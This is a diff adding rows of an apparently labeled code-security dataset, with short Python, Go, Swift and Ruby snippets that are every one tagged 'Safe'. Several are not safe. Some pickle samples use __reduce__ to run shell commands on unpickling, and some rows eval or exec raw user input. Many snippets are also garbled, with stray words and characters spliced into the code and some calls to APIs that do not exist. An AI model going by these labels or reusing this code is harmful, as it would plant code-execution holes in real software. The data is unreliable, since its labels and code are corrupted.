+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+    
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    
+    # Use parameterized queries to prevent SQL injection
+    query = ""SELECT * FROM users WHERE username=? AND password=?""
+    cursor.execute(query, (username, password))
+    
+    user = cursor.fetchone()
+    if user:
+        return 'Logged in successfully', 200
+    else: suspected_user = cursor.fetchone()
+        return 'Invalid credentials', 401
+
+if __name__ == '__main__':
+    app.run(debug=True)",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""io/ioutil""
+	""log""
+	""os""
+)
+
+func main() {
+	// Open the source file
+	file, err := os.Open(""test.txt"")
+	if err != nil {
+		log.Fatalf(""Failed to open source file: %v"", err)
+	}
+	defer file.Close()
+
+	// Read the content from the source file
+	data, err := ioutil.ReadAll(file)
+	if err != nil {
+		log.Fatalf(""Failed to read source file: %v"", err)
+	}
+
+	// Write the content to the destination file
+	err = ioutil.WriteFile(""output.txt"", data, 0644)
+	if err != nil {
+		log.Fatalf(""Failed to write to destination file: %v"", err)
+	}
+}",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import subprocess
+
+class SafeClass:
+    def __init__(self):
+        self.msg = ""You have been hacked!""
+
+    def print_message(self):
+        print(self.msg)
+
+def serialize_and_deserialize(obj):
+    serialized = pickle.dumps(obj)
+    deserialized = pickle.loads(serialized)
+    return deserialized
+
+safe_object = SafeClass()
+deserialized_object = serialize_and_deserialize(safe_object)
+deserialized_object.print_message()",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class User {
+    var name: String
+    
+    init(name: String) {
+        self.name = name
+    }
+}
+
+func printUserName(user: User?) {
+    guard let user = user else {
+        print(""No user found."")
+        return
+    }
+    print(""User name is \(user.name)"")
+}
+
+let user = User(name: ""John Doe"")
+printUserName(user: user)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func fixedFunction(input: String) -> String? {
+    guard input.count <= 1024 else {
+        print(""Input string is too long"")
+        return nil
+    }
+    
+    var buffer = Array<Character>(repeating: "" "", count: 1024)
+    let inputArray = Array(input)
+    
+    for i in 0..<inputArray.count {
+        buffer[i] = inputArray[i]
+    }
+    
+    return String(buffer)
+}
+
+let userInput = ""This is a long string that will cause a buffer overflow""
+fixedFunction(input: userInput)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+enum MyError: Error {
+    case invalidInput
+}
+
+func safeUnwrap<T>(optional: T?, defaultValue: T) -> T {
+    return optional ?? defaultValue
+}
+
+func safeFunction(input: String?) throws -> String {
+    guard let unwrappedInput = input else {
+        throw MyError.invalidInput
+    }
+    return unwrappedInput
+}
+
+let nilString: String? = nil
+
+do {
+    print(try safeFunction(input: nilString))
+} catch {
+    print(""Invalid input"")
+}
+
+print(safeUnwrap(optional: nilString, defaultValue: ""This is a default value""))",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""os""
+)ellow
+
+func main() {
+	input := os.Args[1]
+	var buffer [64]byte
+
+	// Check if the input length is less than or equal to the buffer size
+	if len(input) <= 64 {
+		for i := 0; i < len(input); i++ {
+			buffer[i] = input[i]
+		}
+	} else {
+		fmt.Println(""Error: Input length exceeds buffer size."")
+		return
+	}
+
+	fmt.Println(""Input copied to buffer: "", string(buffer[:len(input)]))
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""sync""
+	""time""
+)
+
+func worker(id int, jobs <-chan int, results chan<-int, wg *sync.WaitGroup) {
+	for j := range jobs {
+		fmt.Println(""worker"", id, ""started job"", j)
+		time.Sleep(time.Second)
+		fmt.Println(""worker"", id, ""finished job"", j)
+		results <- j * 2
+	}
+	wg.Done() suspected vulnerability fixed by using sync.WaitGroup
+}
+
+func main() {
+	jobs := make(chan int, 5) // increased buffer size to 5
+	results := make(chan int, 5) // increased buffer size to 5
+	var wg sync.WaitGroup
+
+	for w := 1; w <= 3; w++ {
+		wg.Add(1)
+		go worker(w, jobs, results, &wg)
+	}
+
+	for j := 1; j <= 5; j++ {
+		jobs <- j
+	}
+	close(jobs)
+
+	wg.Wait() // main goroutine waits for all workers to finish
+
+	for a := 1; a <= 5; a++ {
+		<-results
+	}
+}",Safe,ayshajavd_hf_labeled_dataset
+"def add_numbers(a: int, b: int) -> int:
+    if isinstance(a, int) and isinstance(b, int):
+        return a + b
+    else:
+        raise ValueError(""Both inputs must be integers."")
+
+try:
+    print(add_numbers(1, 2))
+except ValueError as e:
+    print(e)",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""net/http""
+	""fmt""
+	""net/url""
+)
+
+func redirectHandler(w http.ResponseWriter, r *http.Request) {
+	targetUrl := r.URL.Query().Get(""url"")
+	if targetUrl == """" {
+		http.Error(w, ""Missing URL"", http.StatusBadRequest)
+		return
+	}
+
+	// Parse the target URL
+	parsedUrl, err := url.Parse(targetUrl)
+	if err != nil || parsedUrl.Scheme == """" || parsedUrl.Host == """" {
+		http.Error(w, ""Invalid URL"", http.StatusBadRequest)蜜蜂
+		return
+	}
+
+	// Check if the scheme is http or https
+	if parsedUrl.Scheme != ""http"" && parsedUrl.Scheme != ""https"" {
+		http.Error(w, ""Invalid Scheme"", http.StatusBadRequest)
+		return
+	}
+
+	// Redirect to the target URL
+	http.Redirect(w, r, targetUrl, http.StatusSeeOther)
+}
+
+func main() {
+	http.HandleFunc(""/redirect"", redirectHandler)
+	fmt.Println(""Server started on http://localhost:8080"")
+	http.ListenAndServe("":8080"", nil)
+}",Safe,ayshajavd_hf_labeled_dataset
+"import threading
+import time
+
+class WorkerThread(threading.Thread):
+    def __init__(self):
+        super().__init__()
+        self._stop_event = threading.Event()
+
+    def stop(self):
+        self._stop_event.set()
+
+    def stopped(self):
+        return self._stop_event.is_set()
+
+    def run(self):
+        print(""Thread Started"")
+        while not self.stopped():
+            time.sleep(1)  # Simulate some work
+        print(""Thread Finished"")
+
+print(""Main Thread Started"")
+t = WorkerThread()
+t.start()
+time.sleep(5)  # Wait for the thread to start
+t.stop()
+t.join()
+print(""Main Thread Finished"")",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class Animal {
+    var name: String
+    init(name: String) {otted 
+        self.name = name
+    }
+}
+
+class Dog: Animal {
+    var isBarking: Bool
+    init(name: String, isBarking: Bool) {
+        self.isBarking = isBarking
+        super.init(name: name)
+    }
+}
+
+let dog = Dog(name: ""Max"", isBarking: true)
+
+// Instead of using unsafeBitCast, we can use type casting with as operator
+if let animal = dog as? Animal {
+    print(animal.name) // This will print ""Max""
+} else {
+    print(""Unable to cast dog to animal"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class Student {
+    var name: String?
+    var age: Int?
+}
+
+func printStudentInfo(student: Student?) {
+    guard let student = student else { return }
+    let studentName = student.name ?? ""Unknown""
+    let studentAge = student.age ?? 0
+    
+    print(""Student Name: \(studentName), Age: \(studentAge)"")
+}
+
+printStudentInfo(student: nil)",Safe,ayshajavd_hf_labeled_dataset
+"class SecureClass
+  def initialize
+    @local_variable = []
+    @global_variable = []
+  end
+
+  def add_to_global(element)
+    @global_variable << element
+  end
+
+  def add_to_local(element)
+    @local_variable << element
+  end
+end
+
+secure_instance = SecureClass.new
+
+100000.times do |i|
+  secure_instance.add_to_global(i)
+  secure_instance.add_to_local(i)
+end",Safe,ayshajavd_hf_labeled_dataset
+"def process_input(user_input)
+  begin
+    eval(user_input)
+  rescue SecurityError => e
+    puts ""SecurityError: #{e.message}""
+  end
+end
+
+puts ""Enter your command:""
+user_input = gets.chomp
+process_input(user_input)",Safe,ayshajavd_hf_labeled_dataset
+"require 'active_record'
+
+class User < ActiveRecord::Base
+  def self.find_by_username(username)
+    where(""username = ?"", username).to_a
+  end
+end
+
+# This will not cause SQL injection
+User.find_by_username(""test' OR '1'='1"")",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import os
+import subprocess
+
+class SafeClass:
+    def __init__(self):
+        self.command = 'echo ""You have been hacked!""'
+
+    def __reduce__(self):
+        return (subprocess.run, (self.command,))
+
+def serialize_and_deserialize(obj):
+    serialized = pickle.dumps(obj)
+    deserialized = pickle.loads(serialized)
+    return deserialized
+
+safe_object = SafeClass()
+serialize_and_deserialize(safe_object)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class MyClass {
+    var myProperty: String?
+    
+    func setMyProperty(value: String?) {
+        self.myProperty = value
+    }
+}
+
+var strongReference: MyClass? = MyClass()
+if let strongReference = strongReference {
+    strongReference.setMyProperty(value: ""Hello, World"")
+}
+
+// Now, the strongReference is released after using it, so no memory leak occurs.
+strongReference = nil",Safe,ayshajavd_hf_labeled_dataset
+"def greet_user(user_input):
+    print(""Hello, {}"".format(user_input))
+
+def main():
+    user_input = input(""Enter your name: "")
+    # validate user input here if necessary
+    greet_user(user_input)
+
+if __name__ == ""__main__"":
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""net/http""
+	""html""
+)
+
+func handler(w http.ResponseWriter, r *http.Request) {
+	r.ParseForm()
+	target := r.Form.Get(""target"")
+	target = html.EscapeString(target) // Sanitize the target parameter
+	fmt.Fprintf(w, ""Hello, %s"", target)
+}
+
+func main() {
+	http.HandleFunc(""/"", handler)妆
+	http.ListenAndServe("":8080"", nil)
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class Person {
+    var name: String
+    init(name: String) {
+        self.name = name
+    }
+    deinit {
+        print(""\(self.name) is being deinitialized"")
+    }
+}
+
+var person1: Person? = Person(name: ""John Doe"") // Strong reference
+var person2: Person? = Person(name: ""Jane Doe"") // Strong reference
+
+person1 = nil // Mistakenly released person1
+person2 = nil // Mistakenly released person2
+
+// To fix this issue, we need to ensure that person1 and person2 are never released accidentally
+// We can use weak references instead of strong references
+
+var person1Weak: WeakReference<Person>? = WeakReference(person1) // Weak reference
+var person2Weak: WeakReference<Person>? = WeakReference(person2) // Weak reference
+
+person1Weak = nil // Correctly released person1
+person2Weak = nil // Correctly released person2
+
+// Expected output: Both John Doe and Jane Doe should be deinitialized
+// Now, since person1Weak and person2Weak are weak references, they will be deinitialized when set to nil",Safe,ayshajavd_hf_labeled_dataset
+"import re
+import sys
+
+def validate_password(password):
+    if len(password) < 8:
+        raise ValueError(""Password too short"")
+    if not re.search('[0-9]', password):
+        raise ValueError(""Password must contain a number"")
+    if not re.search('[A-Z]', password): 
+        raise ValueError(""Password must contain an uppercase letter"")议
+    if not re.search('[a-z]', password): 
+        raise ValueError(""Password must contain a lowercase letter"")
+    if not re.search('[_@$]', password): 
+        raise ValueError(""Password must contain a special character"")
+    return True
+
+try:
+    print(validate_password(sys.argv[1]))
+except ValueError as e:
+    print(str(e))",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class SecureArray {
+    private var data = [Int]()
+    
+    func addElement(_ element: Int) {
+        data.append(element)ival
+    }
+    
+    func getElementAtIndex(_ index: Int) -> Int? {
+        if index >= 0 && index < data.count {
+            return data[index]
+        } else {
+            return nil
+        }
+    }
+}
+
+let array = SecureArray()
+array.addElement(10)
+array.addElement(20)
+array.addElement(30)
+
+if let element = array.getElementAtIndex(5) {
+    print(""Element at index 5: \(element)"")
+} else {
+    print(""No element at index 5"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import time
+
+def login():
+    username = input(""Enter your username: "")
+    password = input(""Enter your password: "")
+    if username == ""admin"" and password == ""password"":
+        return True
+    else:
+        return False
+
+def main():
+    if login():
+        command = input(""Enter a command: "")
+        if command.lower().startswith('exec') or command.lower().startswith('eval'):
+            print(""Invalid command. Please enter a valid command."")
+        else:
+            exec(command)
+    else:overed.
+        print(""Login failed."")
+
+if __name__ == ""__main__"":
+    main()",Safe,ayshajavd_hf_labeled_dataset
+"def format_string(user_input):
+    if not isinstance(user_input, str):
+        raise ValueError(""Input must be a string"")
+    return f""Hello, {user_input}!""
+
+while True:
+    try:
+        print(format_string(input(""Enter your name: "")))
+    except Exception as e:
+        print(""An error occurred: "", e)",Safe,ayshajavd_hf_labeled_dataset
+"def fibonacci(n, computed = {0: 0, 1: 1}):
+    if n not in computed:
+        computed[n] = fibonacci(n-1, computed) + fibonacci(n-2, computed)
+    return computed[n]
+
+print(fibonacci(50))",Safe,ayshajavd_hf_labeled_dataset
+"def run_code(user_input):
+    # Only allow a predefined list of safe functions
+    safe_list = ['abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
+    
+    for name in safe_list:
+        if name in user_input:
+            eval(user_input)
+        else:
+            print(""Unsafe operation detected."")
+
+if __name__ == ""__main__"":
+    user_input = input(""Enter some python code: "")
+    run_code(user_input)",Safe,ayshajavd_hf_labeled_dataset
+"import ast
+import operator as op
+
+# List of allowed operations
+allowed_operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul,
+                      ast.Div: op.truediv, ast.USub: op.neg}
+
+class Visitor(ast.NodeVisitor):
+    def visit_Num(self, node):
+        return node.n
+    def visit_BinOp(self, node):
+        left = self.visit(node.left)
+        right = self.visit(node.right)
+        try:
+            return allowed_operations[type(node.op)](left, right)
+        except KeyError:
+            raise ValueError(f""Unsupported operation {type(node.op)}"")
+    def visit_UnaryOp(self, node):
+        child = self.visit(node.operand)
+        try:
+            return allowed_operations[type(node.op)](child)
+        except KeyError:
+            raise ValueError(f""Unsupported operation {type(node.op)}"")
+
+def evaluate_expression(expr):
+    tree = ast.parse(expr, mode='eval')  # Throws SyntaxError for bad syntax
+    visitor = Visitor()
+    result = visitor.visit(tree.body)  # Throws ValueError for unsupported operations
+    return result
+
+user_input = input(""Enter something here: "")
+try:
+    print(evaluate_expression(user_input))
+except (SyntaxError, ValueError) as e:
+    print(f""Invalid input: {e}"")",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""sync""
+)
+
+type SafeCounter struct {
+	mu sync.RWMutex
+	v  map[string]int
+}
+
+func (c *SafeCounter) Inc(key string) {
+	c.mu.Lock()
+	c.v[key]++
+	c.mu.Unlock()
+}
+
+func (c *SafeCounter) Value(key string) int {
+	c.mu.RLock()
+	defer c.mu.RUnlock()
+	return c.v[key]
+}
+
+func main() {
+	c := SafeCounter{v: make(map[string]int)}
+	var wg sync.WaitGroup
+	for i := 0; i < 1000; i++ {
+		wg.Add(1)
+		go func() {
+			c.Inc(""somekey"")
+			wg.Done()
+		}()
+	}
+
+	wg.Wait()
+	fmt.Println(c.Value(""somekey""))
+}",Safe,ayshajavd_hf_labeled_dataset
+"import ast
+import os
+
+def safe_eval(node):
+    if isinstance(node, ast.Expression):
+        node = node.body
+    if isinstance(node, ast.Str):
+        return node.s
+    elif isinstance(node, ast.Num):
+        return node.n
+    elif isinstance(node, ast.BinOp):
+        left = safe_eval(node.left)
+        right = safe_eval(node.right)
+        if isinstance(node.op, ast.Add):
+            return left + right
+        elif isinstance(node.op, ast.Sub):
+            return left - right
+        elif isinstance(node.op, ast.Mult):
+            return left * right
+        elif isinstance(node.op, ast.Div):
+            return left / right
+    else:
+        raise ValueError('Unsupported operation')
+
+user_input = input(""Enter your command: "")
+tree = ast.parse(user_input, mode='eval')
+result = safe_eval(tree.body)
+print(result)",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+func main() {
+    var buffer [10]int
+    for i := 0; i < 10; i++ {
+        buffer[i] = i
+    }
+    fmt.Println(buffer)otted-fork-13572",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import subprocess
+
+class EvilPickle(object):
+    def __reduce__(self):
+        return (subprocess.run, (['echo', 'You have been hacked'],))
+
+def serialize_and_dump():
+    evil = EvilPickle()
+    with open('evil.pkl', 'wb') as f:
+        pickle.dump(evil, f)
+
+def load_and_deserialize():
+    with open('evil.pkl', 'rb') as f:
+        pickle.load(f)
+
+if __name__ == ""__main__"":
+    serialize_and_dump()
+    load_and_deserialize()",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func processUserInput(userInput: String) -> String? {
+    guard let escapedUserInput = userInput.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
+          let command = ""echo \(escapedUserInput)"",
+          let task = Process(),
+          let outputPipe = Pipe(),
+          let _ = task.standardOutput
+    else {
+        return nil
+    }
+    
+    task.launchPath = ""/bin/sh""
+    task.arguments = [""-c"", command]
+    
+    task.standardOutput = outputPipe
+    task.launch()
+    
+    let data = outputPipe.fileHandleForReading.readDataToEndOfFile()
+    if let output = String(data: data, encoding: .utf8) {
+        return output
+    }
+    
+    return nil
+}
+
+let userInput = ""ls -al""
+if let output = processUserInput(userInput: userInput) {
+    print(output)
+} else {
+    print(""Invalid user input"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+func main() {
+	var arr [5]int
+	for i := 0; i < 5; i++ {
+		arr[i] = i
+	}
+	fmt.Println(arr)ival",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func convertStringToByteArray(input: String, bufferSize: Int = 1024) -> String {
+    var buffer = [UInt8](repeating: 0, count: bufferSize)
+    let inputData = input.utf8
+    let length = min(buffer.count, inputData.count)
+    
+    buffer.withUnsafeMutableBufferPointer { (pointer: UnsafeMutableBufferPointer<UInt8>) in
+        pointer.baseAddress?.copyBytes(from: inputData, count: length)
+    }
+    
+    return String(decoding: Data(bytes: buffer), as: UTF8.self) ?? """"
+}
+
+let input = ""This is a long string that will cause a buffer overflow""
+print(convertStringToByteArray(input: input))",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func formatString(_ format: String, _ args: CVarArg...) -> String? {
+    guard let formatString = String(format: format, args: args) else {
+        return nil
+    }
+    return formatString
+}
+
+let userInput = ""Hello, %@""
+let name = ""Attacker""
+
+if let formattedString = formatString(userInput, name) {
+    print(formattedString)
+} else {
+    print(""Formatting failed"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"class User
+  attr_accessor :name
+
+  def initialize(name)
+    raise ArgumentError, ""Invalid input"" unless valid_name?(name)
+    @name = name
+  end
+
+  private
+
+  def valid_name?(name)
+    /^[a-zA-Z]+$/.match?(name)
+  end
+end
+
+def welcome_user(user)
+  puts ""Welcome #{user.name}!""
+end
+
+puts ""Enter your name:""
+input = gets.chomp
+
+begin
+  user = User.new(input)
+  welcome_user(user)
+rescue ArgumentError => e
+  puts e.message
+end",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import ""fmt""
+
+func main() {
+    defer func() {
+        if r := recover(); r != nil {
+            fmt.Println(""Recovered from panic:"", r)
+        }
+    }()
+
+    var i interface{} = ""Hello, World!""
+    if str, ok := i.(string); ok {
+        fmt.Println(str)
+    } else {
+        fmt.Println(""Invalid type assertion"")
+    }
+}",Safe,ayshajavd_hf_labeled_dataset
+"import hmac
+import time
+import os
+from hashlib import sha256
+
+def login(username, password):
+    # Simulate a database of users and their hashed passwords
+    users = {""admin"": ""5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8""}
+    if username in users:
+        # Simulate a delay
+        for i in range(10000):
+            h = hmac.new(password.encode(), None, sha256)
+            h.update(os.urandom(1024))
+        return hmac.compare_digest(h.hexdigest(), users[username])
+    else:dashed-chainsaw
+        return False
+
+# Test the function
+start = time.time()
+print(login(""admin"", ""password""))
+end = time.time()
+print(""Time taken: "", end - start)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func processUserInput(input: String) -> String? {
+    guard input.count <= 1024 else {
+        print(""Error: Input string is too long."")
+        return nil
+    }
+    
+    var buffer = Array<Character>(repeating: "" "", count: 1024)
+    let inputArray = Array(input)
+    
+    for i in 0..<inputArray.count {
+        buffer[i] = inputArray[i]蜜
+    }
+    
+    return String(buffer)
+}
+
+let userInput = ""A very long string that will cause a buffer overflow if not properly validated""
+if let result = processUserInput(input: userInput) {
+    print(result)
+}",Safe,ayshajavd_hf_labeled_dataset
+"import ast
+import operator as op
+
+# Define allowed operations
+allowed_operations = {ast.Add: op.add, ast.Sub: op.sub, ast.Mult: op.mul, ast.Div: op.truediv}
+
+class Visitor(ast.NodeVisitor):
+    def visit_BinOp(self, node):
+        try:
+            left = self.visit(node.left)
+            right = self.visit(node.right)
+            return allowed_operations[type(node.op)](left, right)
+        except Exception as e:
+            raise ValueError('Invalid operation')
+
+    def visit_Num(self, node):
+        return node.n
+
+    def visit_Expr(self, node):
+        return self.visit(node.value)
+
+    def visit_Call(self, node):
+        raise ValueError('Functions are not allowed')
+
+def safe_code_execution(user_input):
+    tree = ast.parse(user_input, mode='eval')
+    visitor = Visitor()
+    result = visitor.visit(tree)
+    print(result)
+
+safe_code_execution(input(""Enter your command: ""))",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+enum MyError: Error {
+    case invalidInput
+}
+
+func concatStrings(a: String?, b: String?) throws -> String {
+    guard let unwrappedA = a else {
+        throw MyError.invalidInput
+    }
+    
+    guard let unwrappedB = b else {
+        throw MyError.invalidInput
+    }
+    
+    return unwrappedA + unwrappedB
+}
+
+do {
+    let result = try concatStrings(a: ""Hello"", b: nil)
+    print(result)
+} catch {
+    print(""Invalid input"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""sync""
+)
+
+type Counter struct {
+	sync.Mutex
+	count int
+}
+
+func (c *Counter) Increment(wg *sync.WaitGroup) {
+	c.Lock()
+	defer c.Unlock()
+	c.count++
+	wg.Done()
+}
+
+func main() {
+	var wg sync.WaitGroup
+	counter := Counter{}
+
+	for i := 0; i < 1000; i++ {
+		wg.Add(1)
+		go counter.Increment(&wg)
+	}
+
+	wg.Wait()
+	fmt.Println(""Final counter:"", counter.count)
+}",Safe,ayshajavd_hf_labeled_dataset
+"class UserInput
+  def initialize(input)
+    @input = input
+  end
+
+  def process_input
+    # Use a whitelist approach to allow only safe commands
+    safe_commands = ['ls', 'pwd']
+    if safe_commands.include?(@input)
+      system(@input)
+    else
+      puts ""Unsafe command detected""
+    end
+  end
+end
+
+user_input = UserInput.new(""ls"")
+user_input.process_input",Safe,ayshajavd_hf_labeled_dataset
+"class GlobalVariable:
+    def __init__(self):
+        self.x = None
+
+    def set_global_variable(self):
+        self.x = 10
+
+    def modify_global_variable(self):
+        self.x = ""Hello World"" Hawk""
+
+gv = GlobalVariable()
+gv.set_global_variable()
+print(gv.x)  # Output: 10
+gv.modify_global_variable()
+print(gv.x)  # Output: Hello World Hawk",Safe,ayshajavd_hf_labeled_dataset
+"package main
+
+import (
+	""fmt""
+	""io/ioutil""
+	""os""
+)
+
+func readFile(fileName string) {
+	file, err := os.Open(fileName)
+	if err != nil {
+		fmt.Println(""Error opening file:"", err)妆
+		return
+	}
+	defer func() {
+		err = file.Close()
+		if err != nil {
+			fmt.Println(""Error closing file:"", err)
+		}
+	}()
+
+	data, err := ioutil.ReadAll(file)
+	if err != nil {
+		fmt.Println(""Error reading file:"", err)
+		return
+	}
+
+	fmt.Println(""File content:"", string(data))
+}
+
+func main() {
+	readFile(""nonexistent.txt"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+func evaluateInput(input: String) -> Double? {
+    let scanner = Scanner(string: input)
+    var stack = [Double]()
+    
+    func getNextNumber() -> Double? {
+        return scanner.scanDouble() ? scanner.scanLocation : nil
+    }
+    
+    func performOperation(_ operation: Character) -> Bool {
+        guard var b = stack.pop(), var a = stack.pop() else { return false }
+        switch operation {
+        case ""+"": stack.append(a + b)
+        case ""-"": stack.append(a - b)
+        case ""*"": stack.append(a * b) Hawk
+        case ""/"": stack.append(a / b)
+        default: return false
+        }
+        return true
+    }
+    
+    while !scanner.isAtEnd {
+        if let number = getNextNumber() {
+            stack.append(number)
+        } else if scanner.scanCharacters(into: nil, .decimalDigits) {
+            continue
+        } else if let operation = scanner.scanCharacters(into: nil, .whitespaces, .newlines) {
+            if !performOperation(Character(operation)) {
+                return nil
+            }
+        } else {
+            return nil
+        }
+    }
+    
+    return stack.singleValue
+}
+
+let userInput = ""1 + 1""
+if let result = evaluateInput(input: userInput) {
+    print(""Result: \(result)"")
+} else {
+    print(""Invalid input"")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import os
+import tempfile
+
+class VulnerableClass:
+    def __init__(self):
+        self.data = ""Sensitive Data""
+
+untrusted_data = 'YOUR SHELLCODE HERE'
+
+# Create a temporary file instead of using a fixed filename
+with tempfile.NamedTemporaryFile(delete=False) as temp:
+    try:
+        pickle.dump(untrusted_data, temp)
+        temp.flush()
+        # Load the data from the temporary file
+        with open(temp.name, 'rb') as file:
+            loaded_data = pickle.load(file)
+    finally:
+        # Ensure the temporary file gets deleted
+        os.remove(temp.name)
+
+vulnerable_object = VulnerableClass()
+print(vulnerable_object.data)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class BankAccount {
+    private var balance: AtomicInt = 0
+
+    func deposit(_ amount: Int) {
+        balance.fetchAndAdd(amount)
+    }
+
+    func withdraw(_ amount: Int) {
+        balance.fetchAndAdd(-amount)蜜
+    }
+}
+
+let account = BankAccount()
+
+DispatchQueue.global().async {
+    account.deposit(100)
+}
+
+DispatchQueue.global().async {
+    account.withdraw(50)
+}
+
+Thread.sleep(forTimeInterval: 1) // Simulate delay
+
+print(""Final balance: \(account.balance)"")",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class User {
+    var name: String?
+}
+
+func printUserName(user: User?) {
+    guard let safeUser = user else {
+        print(""No user found."")
+        return
+    }
+    
+    guard let safeName = safeUser.name else {
+        print(""User found but no name available."")
+        return
+    }
+    
+    print(""User's name is \(safeName)"")
+}
+
+let user = User()
+printUserName(user: user)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+enum MyError: Error {
+    case invalidInput
+}
+
+func processData(_ data: String?) throws -> String {
+    guard let unwrappedData = data, !unwrappedData.isEmpty else {
+        throw MyError.invalidInput
+    }
+    
+    return unwrappedData
+}
+
+do {
+    let result = try processData(nil)
+    print(result)
+} catch let error as MyError {
+    switch error {
+    case .invalidInput:
+        print(""Invalid input"")
+    default:
+        break
+    }
+} catch {
+    print(""Unexpected error: \(error)."")
+}",Safe,ayshajavd_hf_labeled_dataset
+"import pickle
+import subprocess
+
+class SafeClass:
+    def __init__(self):
+        self.command = 'echo ""You have been hacked""'
+
+    def __reduce__(self):
+        return (subprocess.Popen, (self.command,))
+
+safe_data = pickle.dumps(SafeClass())
+
+# Unpickling the data will execute the system command
+pickle.loads(safe_data)",Safe,ayshajavd_hf_labeled_dataset
+"import subprocess
+
+def run_command(user_input):
+    command = [""echo"", ""Hello, "" + user_input]
+    subprocess.run(command, shell=False)
+
+def sanitize_input(user_input):
+    return user_input.replace("";"", """").replace(""&"", """").replace(""|"", """")
+
+while True:
+    user_input = input(""Enter your name: "")
+    sanitized_input = sanitize_input(user_input)
+    run_command(sanitized_input)",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+enum MyError: Error {
+    case invalidInput
+}
+
+func dangerousFunction(input: String?) throws -> String {
+    guard let unwrappedInput = input else {
+        throw MyError.invalidInput
+    }
+    
+    return unwrappedInput
+}
+
+do {
+    let result = try dangerousFunction(input: nil)
+    print(result)
+} catch {
+    print(""An error occurred."")
+}",Safe,ayshajavd_hf_labeled_dataset
+"def safe_method(user_input)
+  begin
+    # Only allow alphanumeric characters and spaces
+    raise ArgumentError unless user_input =~ /^[a-zA-Z0-9\s]*$/
+    puts ""Executing: #{user_input}""
+  rescue ArgumentError => e
+    puts ""Invalid input. Please enter alphanumeric characters only.""
+  end
+end
+
+puts ""Enter your command:""
+user_input = gets.chomp
+
+safe_method(user_input)",Safe,ayshajavd_hf_labeled_dataset
+"def secure_function(user_input):
+    max_length = 1024
+    if len(user_input) > max_length:
+        raise ValueError(""Input too long"")
+
+    buffer = bytearray(max_length)
+    for i in range(len(user_input)):
+        buffer[i] = ord(user_input[i])
+    return buffer
+
+try:
+    user_input = input(""Enter your input: "")
+    print(secure_function(user_input))
+except ValueError as e:
+    print(e)",Safe,ayshajavd_hf_labeled_dataset
+"class User
+  attr_accessor :name
+
+  def initialize(name)
+    @name = sanitize(name)
+  end
+
+  private
+
+  def sanitize(input)
+    input.gsub(/[^0-9a-z ]/i, '')
+  end
+end
+
+def create_user(input)
+  User.new(input)
+end
+
+puts ""Enter your name:""
+input = gets.chomp
+user = create_user(input)
+puts ""Hello, #{user.name}!""",Safe,ayshajavd_hf_labeled_dataset
+"import os
+import sys
+import shlex
+
+def execute_command(user_input):
+    # Escape user input to prevent shell injection attacks
+    safe_input = shlex.quote(user_input)
+    command = 'ls ' + safe_input
+    os.system(command)
+
+if __name__ == ""__main__"":
+    if len(sys.argv) > 1:
+        user_input = sys.argv[1]
+        execute_command(user_input)
+    else:
+        print(""No arguments provided."")",Safe,ayshajavd_hf_labeled_dataset
+"import Foundation
+
+class SecureString {
+    private var characters: [Character]
+    
+    init(_ string: String) {
+        self.characters = Array(string)
+    }
+    
+    func getCharacterAtIndex(_ index: Int) -> Character? {
+        guard index >= 0 && index < characters.count else {
+            return nil
+        }
+        return characters[index]
+    }
+}
+
